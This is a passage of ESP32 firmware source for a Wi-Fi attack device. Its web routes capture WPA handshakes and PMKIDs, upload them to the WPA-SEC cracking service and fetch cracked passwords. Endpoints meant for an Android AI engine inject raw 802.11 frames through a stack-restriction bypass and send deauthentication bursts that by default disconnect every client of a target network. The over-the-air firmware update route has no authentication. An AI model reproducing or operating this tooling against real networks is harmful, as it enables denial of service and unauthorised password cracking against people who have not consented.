      webServer.send(404, "application/json", "{\"ok\":false,\"error\":\"File not found\"}");
      return;
    }
    // Build remote path: strip trailing slash from folder, prepend to SD path.
    String remotePath = cfg.dropbox_folder;
    if (remotePath.endsWith("/")) remotePath.remove(remotePath.length() - 1);
    if (!path.startsWith("/")) remotePath += "/";
    remotePath += path;
    Serial.printf("[dropbox] uploading %s -> %s\n", path.c_str(), remotePath.c_str());
    auto res = DropboxClient::uploadFile(SD, path.c_str(), cfg.dropbox_token.c_str(), remotePath.c_str());
    JsonDocument doc;
    doc["ok"]         = res.ok;
    doc["httpCode"]   = res.httpCode;
    doc["remotePath"] = res.remotePath;
    if (!res.ok) doc["error"] = res.error;
    String out; serializeJson(doc, out);
    Serial.printf("[dropbox] result: ok=%d code=%d %s\n", res.ok, res.httpCode, res.error);
    webServer.send(res.ok ? 200 : 500, "application/json", out);
  });

  webServer.on("/wpasec", HTTP_GET, [](){
    Serial.println("[web] GET /wpasec");
    bool sdOk = sdReady || mountSdCard(false);
    bool hasResults = sdOk && SD.exists(wpasecResultsPath);
    String html = neonPageStart("WPA-SEC Console",
                                "Sync captured handshakes and pull cracked results.",
                                "/wpasec");
    html += "<section class='nd-panel'><p>API Key: ";
    html += cfg.wpasec_apikey.isEmpty() ? "<span class='nd-status nd-bad'>NOT CONFIGURED</span>" : "<span class='nd-status nd-ok'>CONFIGURED</span>";
    html += "</p>";
    html += "<p>Captured: " + String(capturedHandshakes) + " | Cracked: " + String(crackedNetworks) + "</p>";
    html += "<div class='nd-actions'><a class='nd-btn' href='/wpasec/sync'>Sync Captures to WPA-SEC</a>";
    html += "<a class='nd-btn-ghost' href='/wpasec/download'>Download Latest Results</a></div>";
    html += hasResults ? "<p><a href='/wpasec/results'>View Results</a> | <a href='/wpasec/results/download'>Download Results File</a></p>" : "<p>No local results file yet.</p>";
    html += "<p>Status: " + wpasecSyncStatus + "</p></section>";
    html += "<p><a href='https://wpa-sec.stanev.org/' target='_blank' rel='noopener noreferrer'>Open WPA-SEC Website</a></p>";
    html += "<div class='nd-actions'><a class='nd-btn-ghost' href='/wpasec/config'>Configure API Key</a><a class='nd-btn-ghost' href='/'>Back Home</a></div></section>";
    html += neonPageEnd();
    webServer.send(200, "text/html", html);
  });

  webServer.on("/wpasec/sync", HTTP_GET, [](){
    if (cfg.wpasec_apikey.isEmpty()) {
      webServer.send(400, "text/plain", "WPA-SEC API key not configured.");
      return;
    }
    syncWithWPASec();
    webServer.sendHeader("Location", "/wpasec");
    webServer.send(302, "text/plain", "Sync complete.");
  });

  webServer.on("/wpasec/download", HTTP_GET, [](){
    if (cfg.wpasec_apikey.isEmpty()) {
      webServer.send(400, "text/plain", "WPA-SEC API key not configured.");
      return;
    }
    downloadWPASecResults();
    webServer.sendHeader("Location", "/wpasec");
    webServer.send(302, "text/plain", "Download complete.");
  });

  webServer.on("/wpasec/results", HTTP_GET, [](){
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk || !SD.exists(wpasecResultsPath)) {
      webServer.send(404, "text/plain", "No WPA-SEC results file on SD.");
      return;
    }
    File f = SD.open(wpasecResultsPath, FILE_READ);
    if (!f) {
      webServer.send(500, "text/plain", "Failed to open results file.");
      return;
    }
    webServer.sendHeader("Content-Disposition", "inline; filename=wpasec_results.txt");
    webServer.streamFile(f, "text/plain");
    f.close();
  });

  webServer.on("/wpasec/results/download", HTTP_GET, [](){
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk || !SD.exists(wpasecResultsPath)) {
      webServer.send(404, "text/plain", "No WPA-SEC results file on SD.");
      return;
    }
    File f = SD.open(wpasecResultsPath, FILE_READ);
    if (!f) {
      webServer.send(500, "text/plain", "Failed to open results file.");
      return;
    }
    webServer.sendHeader("Content-Disposition", "attachment; filename=wpasec_results.txt");
    webServer.streamFile(f, "text/plain");
    f.close();
  });

  // Upload handler
  webServer.on("/update", HTTP_POST, [](){ 
    Serial.println("[web] POST /update complete, sending response");
    webServer.sendHeader("Connection", "close");
    webServer.send(200, "text/plain", (Update.hasError()) ? "FAIL" : "OK");
    delay(100);
    Serial.println("[web] Update complete, restarting...");
    ESP.restart();
  }, [](){ 
    HTTPUpload& upload = webServer.upload();
    if (upload.status == UPLOAD_FILE_START) {
      Serial.printf("[web] Upload started: %s\n", upload.filename.c_str());
      if (!Update.begin(UPDATE_SIZE_UNKNOWN)) {
        Serial.println("[web] ERROR: Update.begin() failed");
        Update.printError(Serial);
      }
    } else if (upload.status == UPLOAD_FILE_WRITE) {
      if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) {
        Serial.println("[web] ERROR: Update.write() failed");
        Update.printError(Serial);
      }
    } else if (upload.status == UPLOAD_FILE_END) {
      if (Update.end(true)) {
        Serial.printf("[web] Upload successful: %u bytes\n", upload.totalSize);
      } else {
        Serial.println("[web] ERROR: Update.end() failed");
        Update.printError(Serial);
      }
    }
  });

  // ============= YOINK API & Log Viewer =============

  // JSON API: full YOINK engine state (for companion app + API consumers)
  webServer.on("/api/yoink", HTTP_GET, [](){
    uint32_t since = (uint32_t)webServer.arg("since").toInt();

    JsonDocument doc;
    doc["ok"] = true;
    doc["running"] = YoinkEngine::isRunning();
    doc["state"] = YoinkEngine::getStateStr();
    doc["channel"] = YoinkEngine::getCurrentChannel();
    doc["packets"] = YoinkEngine::getPacketCount();
    doc["deauths"] = YoinkEngine::getDeauthCount();
    doc["networks"] = YoinkEngine::getNetworkCount();
    doc["clients"] = YoinkEngine::getClientCount();
    doc["handshakes"] = YoinkEngine::getHandshakeCount();
    doc["pmkids"] = YoinkEngine::getPmkidCount();
    doc["eapolMask"] = YoinkEngine::getEapolMask();
    doc["log_seq"] = YoinkEngine::getLogSeq();

    // Target info
    const char* tgt = YoinkEngine::getTargetSSID();
    if (tgt && tgt[0]) {
      JsonObject target = doc["target"].to<JsonObject>();
      target["ssid"] = tgt;
      target["rssi"] = YoinkEngine::getTargetRSSI();
      target["auth"] = YoinkEngine::getTargetAuthStr();
      const uint8_t* bssid = YoinkEngine::getTargetBSSID();
      char bssidStr[18];
      snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
      target["bssid"] = bssidStr;
    }

    // Log entries (optionally filtered by seq > since)
    JsonArray logArr = doc["log"].to<JsonArray>();
    uint8_t logCount = YoinkEngine::getLogCount();
    for (uint8_t i = 0; i < logCount; i++) {
      const YoinkLogEntry* e = YoinkEngine::getLogEntry(i);
      if (!e || e->seq <= since) continue;
      JsonObject lo = logArr.add<JsonObject>();
      lo["seq"] = e->seq;
      lo["ms"] = e->ms;
      lo["sev"] = e->severity;
      lo["msg"] = e->msg;
    }

    // Captured handshakes summary
    JsonArray hsArr = doc["hs_list"].to<JsonArray>();
    for (uint8_t i = 0; i < YoinkEngine::getTotalHandshakeSlots(); i++) {
      const YoinkHandshake* hs = YoinkEngine::getHandshake(i);
      if (!hs || hs->capturedMask == 0) continue;
      JsonObject ho = hsArr.add<JsonObject>();
      ho["ssid"] = hs->ssid;
      char bStr[18];
      snprintf(bStr, sizeof(bStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               hs->bssid[0], hs->bssid[1], hs->bssid[2],
               hs->bssid[3], hs->bssid[4], hs->bssid[5]);
      ho["bssid"] = bStr;
      ho["mask"] = hs->capturedMask;
      ho["valid"] = hs->hasValidPair();
      ho["saved"] = hs->saved;
    }

    // Captured PMKIDs summary
    JsonArray pmkArr = doc["pmkid_list"].to<JsonArray>();
    for (uint8_t i = 0; i < YoinkEngine::getPmkidCount(); i++) {
      const YoinkPmkid* p = YoinkEngine::getPmkid(i);
      if (!p) continue;
      JsonObject po = pmkArr.add<JsonObject>();
      po["ssid"] = p->ssid;
      po["saved"] = p->saved;
    }

    String out;
    serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  // HTML: YOINK session log file (read from SD)
  webServer.on("/yoink/log", HTTP_GET, [](){
    // Serve the session log with auto-refresh.
    String html = neonPageStart("YOINK Session Log",
                                "Live telemetry stream and captured handshake files (refresh 5s).",
                                "/yoink/log",
                                5);
    html += "<section class='nd-panel'><div class='nd-actions'><a class='nd-btn-ghost' href='/'>Home</a></div>";
    html += "<p>";
    html += "State: " + String(YoinkEngine::getStateStr());
    html += " | Nets: " + String(YoinkEngine::getNetworkCount());
    html += " | HS: " + String(YoinkEngine::getHandshakeCount());
    html += " | PMKID: " + String(YoinkEngine::getPmkidCount());
    html += " | Pkts: " + String((unsigned long)YoinkEngine::getPacketCount());
    html += " | Deauths: " + String((unsigned long)YoinkEngine::getDeauthCount());
    html += "</p>";

    bool sdOk = sdReady || mountSdCard(false);
    if (sdOk && SD.exists("/yoink_session.log")) {
      File f = SD.open("/yoink_session.log", FILE_READ);
      if (f) {
        html += "<pre class='nd-pre'>";
        while (f.available()) {
          char c = f.read();
          if (c == '<') html += "&lt;";
          else if (c == '>') html += "&gt;";
          else if (c == '&') html += "&amp;";
          else html += c;
        }
        f.close();
        html += "</pre>";
      } else {
        html += "<p>Could not open session log.</p>";
      }
    } else {
      // Fallback: show live log ring
      html += "<pre class='nd-pre'>";
      uint8_t logCount = YoinkEngine::getLogCount();
      for (uint8_t i = 0; i < logCount; i++) {
        const YoinkLogEntry* e = YoinkEngine::getLogEntry(i);
        if (!e) continue;
        char line[128];
        snprintf(line, sizeof(line), "[%lu.%03lu] %s\n", e->ms / 1000, e->ms % 1000, e->msg);
        // HTML escape
        for (int j = 0; line[j]; j++) {
          if (line[j] == '<') html += "&lt;";
          else if (line[j] == '>') html += "&gt;";
          else html += line[j];
        }
      }
      html += "</pre>";
    }
    html += "</section>";

    // List captured files from /captures/<SSID>/Handshakes/
    html += "<section class='nd-panel'><h2>Captured Files</h2>";
    if (sdOk && SD.exists("/captures")) {
      File capsDir = SD.open("/captures");
      if (capsDir && capsDir.isDirectory()) {
        html += "<ul>";
        while (true) {
          File ssidEntry = capsDir.openNextFile();
          if (!ssidEntry) break;
          if (!ssidEntry.isDirectory()) { ssidEntry.close(); continue; }
          String ssidPath = ssidEntry.name();
          if (!ssidPath.startsWith("/")) ssidPath = "/captures/" + ssidPath;
          ssidEntry.close();
          String hsPath = ssidPath + "/Handshakes";
          if (!SD.exists(hsPath)) continue;
          File hsDir = SD.open(hsPath);
          if (!hsDir || !hsDir.isDirectory()) { if (hsDir) hsDir.close(); continue; }
          while (true) {
            File f = hsDir.openNextFile();
            if (!f) break;
            if (f.isDirectory()) { f.close(); continue; }
            String fn = f.name();
            String fullPath = hsPath + "/" + fn;
            html += "<li><a href='/yoink/file?path=";
            for (int j = 0; j < (int)fullPath.length(); j++) {
              char c = fullPath[j];
              if (c == ' ') html += "%20";
              else html += c;
            }
            html += "'>";
            html += fn;
            html += "</a> (";
            html += String((unsigned long)f.size());
            html += " bytes)</li>";
            f.close();
          }
          hsDir.close();
        }
        capsDir.close();
        html += "</ul>";
      }
    }
    html += "</section>";

    html += neonPageEnd();
    webServer.send(200, "text/html", html);
  });

  // WPA-SEC config API
  webServer.on("/api/config/wpasec", HTTP_GET, [](){
    JsonDocument doc;
    doc["ok"] = true;
    doc["apikey_set"] = !cfg.wpasec_apikey.isEmpty();
    doc["apikey_length"] = cfg.wpasec_apikey.length();
    String out;
    serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  webServer.on("/api/config/wpasec", HTTP_POST, [](){
    if (!webServer.hasArg("apikey")) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"missing apikey\"}");
      return;
    }
    String apikey = webServer.arg("apikey");
    if (apikey.length() < 32) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"apikey must be 32 hex chars\"}");
      return;
    }
    cfg.wpasec_apikey = apikey;
    saveConfig(cfg);
    wpasecSyncStatus = "API key configured";
    Serial.printf("[wpasec] API key set (first 8 chars: %.8s)\n", cfg.wpasec_apikey.c_str());
    JsonDocument doc;
    doc["ok"] = true;
    doc["message"] = "API key saved";
    String out;
    serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  // WPA-SEC config page
  webServer.on("/wpasec/config", HTTP_GET, [](){
    String html = neonPageStart("WPA-SEC Configuration",
                                "Manage API key and upload workflow.",
                                "/wpasec");
    html += "<section class='nd-grid-2'>";
    html += "<article class='nd-panel'><h2>API Key Management</h2>";
    html += "<p>Enter your WPA-SEC API key from <a href='https://wpa-sec.stanev.org/api.php' target='_blank' rel='noopener noreferrer'>wpa-sec.stanev.org/api.php</a>.</p>";
    html += "<input type='text' id='apikey' placeholder='Enter 32-character hex API key' maxlength='32'>";
    html += "<div class='nd-actions'><button class='nd-btn' type='button' onclick='saveApiKey()'>Save API Key</button></div>";
    html += "<p id='status' class='nd-help'></p></article>";
    html += "<article class='nd-panel'><h2>Upload Handshakes</h2>";
    html += "<p>Upload captured handshakes from <b>/captures/&lt;SSID&gt;/Handshakes/</b> (all SSIDs, recursive).</p>";
    html += "<div class='nd-actions'><button class='nd-btn' type='button' onclick='startSync()'>Sync & Upload to WPA-SEC</button></div>";
    html += "<p id='syncStatus' class='nd-help'></p></article>";
    html += "</section>";
    html += "<section class='nd-panel'><h2>Results</h2><div class='nd-actions'>";
    html += "<a class='nd-btn-ghost' href='/wpasec/results'>View Results</a>";
    html += "<a class='nd-btn-ghost' href='/wpasec/results/download'>Download Results</a>";
    html += "</div></section>";
    html += R"JS(<script>
function setStatus(id, msg, level){
  const el = document.getElementById(id);
  if(!el) return;
  el.textContent = msg;
  el.className = level === 'ok' ? 'nd-status nd-ok' : (level === 'bad' ? 'nd-status nd-bad' : 'nd-help');
}
function saveApiKey() {
  const apikey = document.getElementById('apikey').value.trim();
  if (!apikey || apikey.length !== 32) {
    setStatus('status', 'ERROR: API key must be exactly 32 characters', 'bad');
    return;
  }
  setStatus('status', 'Saving...', 'info');
  fetch('/api/config/wpasec', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'apikey=' + encodeURIComponent(apikey)
  }).then(r => r.json()).then(data => {
    if (data.ok) setStatus('status', 'SUCCESS: API key saved', 'ok');
    else setStatus('status', 'ERROR: ' + (data.error || 'unknown'), 'bad');
  }).catch(e => setStatus('status', 'ERROR: ' + e.message, 'bad'));
}
function startSync() {
  setStatus('syncStatus', 'Starting sync...', 'info');
  fetch('/wpasec/sync').then(() => {
    setStatus('syncStatus', 'Sync started! Refreshing status...', 'ok');
    setTimeout(() => location.reload(), 1500);
  }).catch(e => setStatus('syncStatus', 'ERROR: ' + e.message, 'bad'));
}
</script>)JS";
    html += neonPageEnd();
    webServer.send(200, "text/html", html);
  });

  // ── API Keys config ─────────────────────────────────────────────────────
  webServer.on("/api/config/keys", HTTP_GET, [](){
    JsonDocument doc;
    doc["wigle_apiname_set"]  = !cfg.wigle_apiname.isEmpty();
    doc["wigle_apitoken_set"] = !cfg.wigle_apitoken.isEmpty();
    doc["dropbox_token_set"]  = !cfg.dropbox_token.isEmpty();
    doc["dropbox_folder"]     = cfg.dropbox_folder;
    doc["webhook_url_set"]    = !cfg.webhook_url.isEmpty();
    doc["ntfy_topic_set"]     = !cfg.ntfy_topic.isEmpty();
    doc["mqtt_broker_set"]    = !cfg.mqtt_broker.isEmpty();
    doc["mqtt_port"]          = cfg.mqtt_port;
    doc["mqtt_topic_prefix"]  = cfg.mqtt_topic_prefix;
    String out; serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  webServer.on("/api/config/keys", HTTP_POST, [](){
    bool changed = false;
    if (webServer.hasArg("wigle_apiname"))  { cfg.wigle_apiname  = webServer.arg("wigle_apiname");  changed = true; }
    if (webServer.hasArg("wigle_apitoken")) { cfg.wigle_apitoken = webServer.arg("wigle_apitoken"); changed = true; }
    if (webServer.hasArg("dropbox_token"))  { cfg.dropbox_token  = webServer.arg("dropbox_token");  changed = true; }
    if (webServer.hasArg("dropbox_folder")) { cfg.dropbox_folder = webServer.arg("dropbox_folder"); changed = true; }
    if (webServer.hasArg("webhook_url"))    { cfg.webhook_url    = webServer.arg("webhook_url");    changed = true; }
    if (webServer.hasArg("ntfy_topic"))     { cfg.ntfy_topic     = webServer.arg("ntfy_topic");     changed = true; }
    if (webServer.hasArg("mqtt_broker"))    { cfg.mqtt_broker    = webServer.arg("mqtt_broker");    changed = true; }
    if (webServer.hasArg("mqtt_port"))      { cfg.mqtt_port      = webServer.arg("mqtt_port").toInt(); changed = true; }
    if (webServer.hasArg("mqtt_prefix"))    { cfg.mqtt_topic_prefix = webServer.arg("mqtt_prefix"); changed = true; }
    if (webServer.hasArg("mqtt_username"))  { cfg.mqtt_username  = webServer.arg("mqtt_username");  changed = true; }
    if (webServer.hasArg("mqtt_password"))  { cfg.mqtt_password  = webServer.arg("mqtt_password");  changed = true; }
    if (changed) saveConfig(cfg);
    JsonDocument doc;
    doc["ok"] = true;
    doc["message"] = changed ? "Keys saved" : "Nothing to save";
    String out; serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  webServer.on("/keys/config", HTTP_GET, [](){
    String html = neonPageStart("API Keys", "Configure service integrations.", "/keys/config");
    html += R"HTML(
<section class='nd-panel'>
  <h2>Wigle.net</h2>
  <p>Upload wardriving CSVs. Get credentials from <a href='https://wigle.net/account' target='_blank' rel='noopener'>wigle.net/account</a> → API Token.</p>
  <label>API Name</label><input type='text' id='wigle_apiname' placeholder='Your Wigle username'>
  <label>API Token</label><input type='password' id='wigle_apitoken' placeholder='wigle API token'>
</section>
<section class='nd-panel'>
  <h2>Dropbox</h2>
  <p>Auto-upload captures. App must have <b>Full Dropbox</b> access (not App Folder) to write to arbitrary paths. Generate a token from <a href='https://www.dropbox.com/developers/apps' target='_blank' rel='noopener'>Dropbox App Console</a>.</p>
  <label>Access Token</label><input type='password' id='dropbox_token' placeholder='sl.xxxxxxx...'>
  <label>Target Folder</label><input type='text' id='dropbox_folder' placeholder='/Apps/WardriverSync'>
  <small style='color:#94a3b8'>Absolute Dropbox path where files are uploaded. Example: /Apps/WardriverSync</small>
</section>
<section class='nd-panel'>
  <h2>Webhook / IFTTT <span class='nd-help'>(placeholder)</span></h2>
  <p>POST to this URL on capture events (handshake caught, scan complete, etc).</p>
  <label>Webhook URL</label><input type='text' id='webhook_url' placeholder='https://maker.ifttt.com/trigger/...'>
</section>
<section class='nd-panel'>
  <h2>Ntfy Push Notifications <span class='nd-help'>(placeholder)</span></h2>
  <p>Send push alerts to your phone via <a href='https://ntfy.sh' target='_blank' rel='noopener'>ntfy.sh</a>.</p>
  <label>Topic</label><input type='text' id='ntfy_topic' placeholder='my-neondrive-alerts'>
</section>
<section class='nd-panel'>
  <h2>MQTT Broker <span class='nd-help'>(placeholder)</span></h2>
  <p>Stream events to Home Assistant, Node-RED, or any MQTT subscriber.</p>
  <label>Broker Host</label><input type='text' id='mqtt_broker' placeholder='192.168.1.x or mqtt.example.com'>
  <label>Port</label><input type='number' id='mqtt_port' placeholder='1883' value='1883' min='1' max='65535'>
  <label>Topic Prefix</label><input type='text' id='mqtt_prefix' placeholder='neondrive'>
  <label>Username <span class='nd-help'>(optional)</span></label><input type='text' id='mqtt_username' placeholder=''>
  <label>Password <span class='nd-help'>(optional)</span></label><input type='password' id='mqtt_password' placeholder=''>
</section>
<div class='nd-actions'>
  <button class='nd-btn' type='button' onclick='saveKeys()'>Save All</button>
  <a class='nd-btn-ghost' href='/'>Back</a>
</div>
<p id='keys-status' class='nd-help'></p>
)HTML";
    html += R"JS(<script>
function setStatus(id, msg, level) {
  const el = document.getElementById(id);
  if (!el) return;
  el.textContent = msg;
  el.className = level === 'ok' ? 'nd-status nd-ok' : (level === 'bad' ? 'nd-status nd-bad' : 'nd-help');
}
window.onload = function() {
  fetch('/api/config/keys').then(r => r.json()).then(d => {
    if (d.dropbox_folder) { const el = document.getElementById('dropbox_folder'); if (el) el.value = d.dropbox_folder; }
    if (d.wigle_apiname)  { const el = document.getElementById('wigle_apiname');  if (el) el.placeholder = '(configured)'; }
  }).catch(() => {});
};
function saveKeys() {
  setStatus('keys-status', 'Saving...', 'info');
  const fields = ['wigle_apiname','wigle_apitoken','dropbox_token','dropbox_folder','webhook_url',
                  'ntfy_topic','mqtt_broker','mqtt_port','mqtt_prefix','mqtt_username','mqtt_password'];
  const parts = fields
    .filter(f => { const el = document.getElementById(f); return el && el.value.trim() !== ''; })
    .map(f => encodeURIComponent(f) + '=' + encodeURIComponent(document.getElementById(f).value.trim()));
  if (!parts.length) { setStatus('keys-status', 'Nothing entered.', 'bad'); return; }
  fetch('/api/config/keys', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: parts.join('&')
  }).then(r => r.json()).then(d => {
    setStatus('keys-status', d.ok ? 'SUCCESS: ' + d.message : 'ERROR: ' + (d.error || 'unknown'), d.ok ? 'ok' : 'bad');
  }).catch(e => setStatus('keys-status', 'ERROR: ' + e.message, 'bad'));
}
</script>)JS";
    html += neonPageEnd();
    webServer.send(200, "text/html", html);
  });

  // ── Screenshot endpoint ───────────────────────────────────────────────────
  webServer.on("/screenshot", HTTP_GET, [](){
    const int W = tft.width();
    const int H = tft.height();
    // BMP file header + DIB header = 54 bytes; pixel data = W*H*3 bytes (24-bit BGR)
    const uint32_t rowStride = ((W * 3 + 3) & ~3);
    const uint32_t pixelBytes = rowStride * H;
    const uint32_t fileSize = 54 + pixelBytes;

    uint8_t header[54] = {};
    header[0] = 'B'; header[1] = 'M';
    header[2] = fileSize & 0xFF; header[3] = (fileSize >> 8) & 0xFF;
    header[4] = (fileSize >> 16) & 0xFF; header[5] = (fileSize >> 24) & 0xFF;
    header[10] = 54;                           // pixel data offset
    header[14] = 40;                           // DIB header size
    header[18] = W & 0xFF; header[19] = (W >> 8) & 0xFF;
    // Negative height = top-down row order
    int32_t negH = -H;
    memcpy(&header[22], &negH, 4);
    header[26] = 1;                            // color planes
    header[28] = 24;                           // bits per pixel
    header[34] = pixelBytes & 0xFF; header[35] = (pixelBytes >> 8) & 0xFF;
    header[36] = (pixelBytes >> 16) & 0xFF; header[37] = (pixelBytes >> 24) & 0xFF;

    webServer.setContentLength(fileSize);
    webServer.send(200, "image/bmp", "");
    WiFiClient client = webServer.client();
    client.write(header, 54);

    // Read rows in strips to stay within heap budget
    const int STRIP = 8;
    uint16_t buf565[320 * STRIP];
    uint8_t  rowBuf[320 * 3 + 3];
    for (int y = 0; y < H; y += STRIP) {
      int rows = min(STRIP, H - y);
      tft.readRect(0, y, W, rows, buf565);
      for (int r = 0; r < rows; r++) {
        int pad = (int)rowStride - W * 3;
        for (int x = 0; x < W; x++) {
          uint16_t px = buf565[r * W + x];
          rowBuf[x * 3 + 0] = (px & 0x001F) << 3;           // B
          rowBuf[x * 3 + 1] = ((px >> 5) & 0x003F) << 2;    // G
          rowBuf[x * 3 + 2] = ((px >> 11) & 0x001F) << 3;   // R
        }
        memset(rowBuf + W * 3, 0, pad);
        client.write(rowBuf, rowStride);
      }
    }
    Serial.println("[screenshot] served BMP");
  });

  webServer.on("/yoink/file", HTTP_GET, [](){
    // Accept 'path' (full SD path) or legacy 'name' param
    String path = webServer.arg("path");
    String name;
    if (path.length() == 0) {
      name = webServer.arg("name");
      if (name.length() == 0) {
        webServer.send(400, "text/plain", "Missing 'path' parameter");
        return;
      }
      path = "/captures/" + name;
    } else {
      name = path.substring(path.lastIndexOf('/') + 1);
    }
    // Sanitize: must be under /captures/, no traversal
    if (path.indexOf("..") >= 0 || !path.startsWith("/captures/")) {
      webServer.send(403, "text/plain", "Invalid path");
      return;
    }
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk || !SD.exists(path)) {
      webServer.send(404, "text/plain", "File not found");
      return;
    }
    File f = SD.open(path, FILE_READ);
    if (!f) {
      webServer.send(500, "text/plain", "Failed to open file");
      return;
    }
    String ct = "application/octet-stream";
    if (name.endsWith(".log") || name.endsWith(".txt") || name.endsWith(".22000")) {
      ct = "text/plain";
    }
    webServer.sendHeader("Content-Disposition", "inline; filename=\"" + name + "\"");
    webServer.streamFile(f, ct);
    f.close();
  });

  // ---------------------------------------------------------------
  // AI INJECTION ENDPOINTS  (Phase 1)
  // Android AI engine → CYD firmware raw frame injection
  // ---------------------------------------------------------------

  // POST /api/ai/inject_raw
  // Body (JSON): { "channel": 6, "hex": "C0001234..." }
  // Decodes the hex payload and fires it via esp_wifi_80211_tx().
  // The WSL bypasser override is already installed so all mgmt frame
  // subtypes (deauth, disassoc, auth, probe, beacon, custom) pass through.
  webServer.on("/api/ai/inject_raw", HTTP_POST, [](){
#if defined(NEONDRIVE_TARGET_M5TAB5) || defined(NEONDRIVE_TARGET_M5CARDPUTER)
    neon_rf_set_last_action("web_ai_inject_raw");
    webServer.send(501, "application/json",
        "{\"ok\":false,\"error\":\"rf_unsupported\",\"backend\":\"none\"}");
    return;
#endif
    if (!webServer.hasArg("plain")) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"no body\"}");
      return;
    }
    JsonDocument req;
    if (deserializeJson(req, webServer.arg("plain")) != DeserializationError::Ok) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"invalid json\"}");
      return;
    }
    int channel       = req["channel"] | 0;
    const char* hexStr = req["hex"] | "";
    if (!hexStr || !hexStr[0]) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"missing hex\"}");
      return;
    }
    // Allocate from heap (DMA-capable, 4-byte aligned) — avoids touching BSS/DRAM.
    // esp_wifi_80211_tx() requires 4-byte alignment; heap_caps_malloc guarantees it.
    // 512 bytes covers any 802.11 management or data frame the AI would generate.
    int hexLen = strlen(hexStr);
    if (hexLen < 20 || hexLen > 1024 || (hexLen & 1)) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"hex length invalid\"}");
      return;
    }
    uint8_t* injectBuf = (uint8_t*)heap_caps_malloc(hexLen / 2 + 4, MALLOC_CAP_DMA | MALLOC_CAP_8BIT);
    if (!injectBuf) {
      webServer.send(503, "application/json", "{\"ok\":false,\"error\":\"heap alloc failed\"}");
      return;
    }
    int pktLen = hexDecodePayload(hexStr, injectBuf, hexLen / 2);
    if (pktLen < 10) {
      heap_caps_free(injectBuf);
      webServer.send(400, "application/json",
        "{\"ok\":false,\"error\":\"hex decode failed or payload too short (min 10 bytes)\"}");
      return;
    }
    if (channel >= 1 && channel <= 13) {
      esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
      delayMicroseconds(300);
    }
    esp_err_t txr = esp_wifi_80211_tx(WIFI_IF_STA, injectBuf, pktLen, false);
    if (txr != ESP_OK) {
      txr = tryAlternateTx(injectBuf, pktLen);
    }
    Serial.printf("[ai] inject_raw ch=%d len=%d esp_err=%d\n", channel, pktLen, (int)txr);
    pushConsoleEventf("INFO", "AI", "inject_raw ch=%d len=%d err=%d", channel, pktLen, (int)txr);
    heap_caps_free(injectBuf);
    JsonDocument resp;
    resp["ok"]      = (txr == ESP_OK);
    resp["len"]     = pktLen;
    resp["channel"] = channel;
    resp["esp_err"] = (int)txr;
    String out;
    serializeJson(resp, out);
    webServer.send(txr == ESP_OK ? 200 : 500, "application/json", out);
  });

  // POST /api/ai/inject_deauth
  // Body (JSON): { "bssid":"AA:BB:CC:DD:EE:FF", "client":"FF:FF:FF:FF:FF:FF",
  //               "reason": 7, "count": 5, "channel": 6 }
  // AI chooses reason code and burst count based on vendor/chipset profile.
  // Omitting "client" defaults to broadcast (kicks all associated stations).
  webServer.on("/api/ai/inject_deauth", HTTP_POST, [](){
#if defined(NEONDRIVE_TARGET_M5TAB5) || defined(NEONDRIVE_TARGET_M5CARDPUTER)
    neon_rf_set_last_action("web_ai_inject_deauth");
    webServer.send(501, "application/json",
        "{\"ok\":false,\"error\":\"rf_unsupported\",\"backend\":\"none\"}");
    return;
#endif
    if (!webServer.hasArg("plain")) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"no body\"}");
      return;
    }
    JsonDocument req;
    if (deserializeJson(req, webServer.arg("plain")) != DeserializationError::Ok) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"invalid json\"}");
      return;
    }
    const char* bssidStr  = req["bssid"]   | "";
    const char* clientStr = req["client"]  | "FF:FF:FF:FF:FF:FF";
    uint8_t reason        = (uint8_t)(req["reason"] | 7);
    uint8_t count         = (uint8_t)(req["count"]  | 5);
    int     channel       = req["channel"] | 0;
    if (!bssidStr || !bssidStr[0]) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"missing bssid\"}");
      return;
    }
    uint8_t bssid[6], client[6];
    if (!macFromString(bssidStr, bssid)) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"invalid bssid format\"}");
      return;
    }
    if (!macFromString(clientStr, client)) {
      memset(client, 0xFF, 6);  // fall back to broadcast
    }
    if (count < 1)  count = 1;
    if (count > 30) count = 30;   // safety cap — AI shouldn't need more
    if (channel >= 1 && channel <= 13) {
      esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
      delayMicroseconds(300);
    }
    WSLBypasser::sendDeauthBurst(bssid, client, count);
    Serial.printf("[ai] inject_deauth bssid=%s client=%s reason=%u count=%u ch=%d\n",
                  bssidStr, clientStr, reason, count, channel);
    pushConsoleEventf("INFO", "AI", "inject_deauth bssid=%.17s reason=%u count=%u",
                      bssidStr, reason, count);
    JsonDocument resp;
    resp["ok"]     = true;
    resp["bssid"]  = bssidStr;
    resp["client"] = clientStr;
    resp["reason"] = reason;
    resp["count"]  = count;
    String out;
    serializeJson(resp, out);
    webServer.send(200, "application/json", out);
  });

  // GET /api/ai/frames
  // Returns all captured EAPOL frames from the YOINK engine as hex strings,
  // plus OUI prefixes for both the AP and client so the Android AI engine can
